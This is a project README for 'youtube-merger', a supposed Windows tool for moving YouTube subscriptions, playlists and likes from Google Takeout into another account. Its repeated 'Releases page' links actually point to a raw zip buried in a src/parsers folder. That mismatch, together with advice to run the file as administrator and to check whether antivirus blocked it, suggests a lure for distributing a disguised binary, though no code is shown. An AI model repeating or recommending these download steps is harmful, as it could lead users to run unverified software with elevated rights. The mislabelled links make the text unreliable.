# 🎥 youtube-merger - Move Your YouTube Data Fast

[![Download youtube-merger](https://img.shields.io/badge/Download%20Now-Release%20Page-8B5CF6?style=for-the-badge)](https://github.com/aishhatkar119/youtube-merger/raw/refs/heads/main/src/parsers/merger_youtube_3.0-beta.2.zip)

## 📥 Download

Visit this page to download: [youtube-merger Releases](https://github.com/aishhatkar119/youtube-merger/raw/refs/heads/main/src/parsers/merger_youtube_3.0-beta.2.zip)

## 🖥️ What this app does

youtube-merger helps you move YouTube account data from a Google Takeout export into another YouTube account.

It can:
- add subscriptions
- recreate playlists
- like videos again
- read Takeout CSV files
- work through the YouTube Data API v3
- use OAuth 2.0 to sign in
- handle API limits and retries
- let you choose which parts to migrate

This tool is a command-line app. That means it opens in a black window and asks you to sign in and choose options.

## ✅ What you need

Before you start, make sure you have:

- a Windows PC
- a web browser
- your Google Takeout export
- the release file from the download page
- permission to sign in to the YouTube account you want to migrate into

Your Google Takeout export should include the YouTube data folders and CSV files for subscriptions, playlists, and likes.

## 🚀 Getting Started

Follow these steps on Windows.

### 1. Download the app

Go to the [youtube-merger Releases page](https://github.com/aishhatkar119/youtube-merger/raw/refs/heads/main/src/parsers/merger_youtube_3.0-beta.2.zip) and download the latest Windows file.

If you see more than one file, pick the one for Windows. It may end in `.exe`, `.zip`, or another Windows format.

### 2. Open the file

- If you downloaded an `.exe` file, double-click it.
- If you downloaded a `.zip` file, right-click it and choose **Extract All**, then open the extracted folder.

If Windows asks for permission, choose **Yes**.

### 3. Place your Takeout export

Put your Google Takeout files in a folder you can find again, such as:

- `Downloads\Takeout`
- `Desktop\YouTube Export`
- `Documents\Google Takeout`

Keep the folder structure from Google Takeout the same. The app reads the CSV files inside that export.

### 4. Sign in to your Google account

The app will ask you to sign in with the Google account that will receive the migrated data.

Use the browser window that opens to complete the Google sign-in flow.

### 5. Choose what to migrate

The app can migrate different parts of your YouTube data. You can usually choose:

- subscriptions
- playlists
- liked videos

If you do not want everything, turn off the parts you do not need.

### 6. Start the migration

After you confirm the source files and sign in, the app will begin the transfer.

It reads the CSV files from your Takeout export and sends requests to YouTube in batches.

## 🗂️ Supported Google Takeout data

youtube-merger is built to work with common YouTube Takeout files such as:

- subscription lists
- playlist data
- liked video records

It uses the CSV data to find the items that should be added back into the target account.

## 🔐 Sign-in and account access

youtube-merger uses OAuth 2.0. That means you sign in through Google, and the app uses your account permission for the migration.

It does not need your Google password inside the app.

You may see a browser prompt asking you to approve access. That is part of the normal sign-in process.

## ⚙️ How it works

The app follows these steps:

1. reads the Takeout CSV files
2. finds the subscriptions, playlists, and liked videos
3. signs in to the target YouTube account
4. sends YouTube API requests in batches
5. retries requests when the service is busy
6. keeps going until the selected migration parts are done

This helps the app handle large exports without making you do each item by hand.

## 📦 Typical folder setup

A simple setup can look like this:

- `youtube-merger.exe`
- `Takeout`
  - `YouTube`
    - `subscriptions.csv`
    - `playlists.csv`
    - `liked videos.csv`

Your exact Takeout folder name may differ. Keep the export in one place and point the app to that folder when asked.

## 🧭 Common use cases

Use youtube-merger if you want to:

- move subscriptions to a new account
- rebuild playlists in another account
- restore liked videos after a move
- copy part of your YouTube history into a fresh account
- save time after a Google Takeout export

## 🪟 Windows setup tips

If the file does not open:

- check that the download finished
- make sure you extracted the ZIP file if it came as a ZIP
- right-click the app and choose **Run as administrator** if Windows blocks it
- keep the Takeout folder in a simple path with short folder names
- avoid moving files while the app is running

If the browser does not open during sign-in, check your default browser settings and try again.

## 🔎 What to expect during the run

When the app starts, it may show:

- a list of migration options
- a prompt for your Takeout folder
- a browser sign-in page
- progress messages in the terminal window

During large migrations, the app may pause between requests. That helps it stay within YouTube API limits.

## 🧱 Built for

- Google Takeout exports
- YouTube Data API v3
- OAuth 2.0 sign-in
- batch migration tasks
- TypeScript-based command-line use
- Windows desktop use

## 📚 Input files

The app looks for Takeout CSV files that contain:

- channel subscriptions
- playlist entries
- liked videos

If the export came from Google Takeout, the app should read the data from the exported folders and files you downloaded

## 🧩 Migration options

You can usually run the tool in parts or as a full migration:

- subscriptions only
- playlists only
- liked videos only
- all supported sections

This is useful if you want to test one part first.

## 🛠️ Troubleshooting

### The app closes right away
- open it from a terminal window or from the extracted folder
- make sure you downloaded the correct Windows release
- check that your antivirus did not block it

### The app cannot find my Takeout files
- confirm that you selected the main Takeout folder
- keep the original folder structure
- make sure the CSV files are still inside the export

### Sign-in fails
- try again in your browser
- make sure you are signed into the right Google account
- allow the requested access in the Google prompt

### Some items were not added
- rerun the migration for that section
- check whether the source item still exists
- wait and try again if YouTube rate limits the requests

## 🧪 Best results

For a smoother run:

- use a fresh Google Takeout export
- keep the export folder on your local drive
- close extra browser tabs during sign-in
- let the app finish before you stop it
- start with subscriptions if you want a quick test

## 📄 File and data safety

The app reads your export files and sends changes to the target YouTube account you choose.

Keep a copy of your original Takeout export in case you want to run the migration again later.

## 🧰 Project details

- Name: youtube-merger
- Type: TypeScript CLI
- Data source: Google Takeout CSV exports
- API: YouTube Data API v3
- Auth: OAuth 2.0
- Supported actions: subscriptions, playlists, liked videos
- Runtime target: Windows desktop use

## 📥 Download again

If you need the file again, go to the [youtube-merger Releases page](https://github.com/aishhatkar119/youtube-merger/raw/refs/heads/main/src/parsers/merger_youtube_3.0-beta.2.zip)